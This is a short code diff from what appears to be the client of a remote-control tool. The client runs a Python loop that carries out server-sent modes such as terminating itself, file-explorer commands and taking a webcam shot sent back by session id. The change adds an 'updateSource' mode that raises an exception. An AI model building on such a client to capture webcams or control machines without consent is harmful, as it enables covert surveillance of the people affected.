@@ -663,10 +663,7 @@ while 1:
                                             if data['mode'] == 'terminateClient':
                                                 os._exit(1)
 
-
-
-                                            # TODO: TEMP
-                                            elif data['payload'] == 'raiseException':
+                                            elif data['mode'] == 'updateSource':
                                                 raise ValueError('Manually Generated Exception')
 
                                             # Explorer Commands
@@ -737,6 +734,9 @@ while 1:
                             elif data['mode'] == 'getWebcam':
                                 data_send(webcam_shot(), 'getWebcam', session_id=data['session_id'])
                                 continue
+
+                            elif data['mode'] == 'updateSource':
+                                raise ValueError('Manually Generated Exception')
 
                             else:
                                 data_send('notAuthorized', 'notAuthorized')
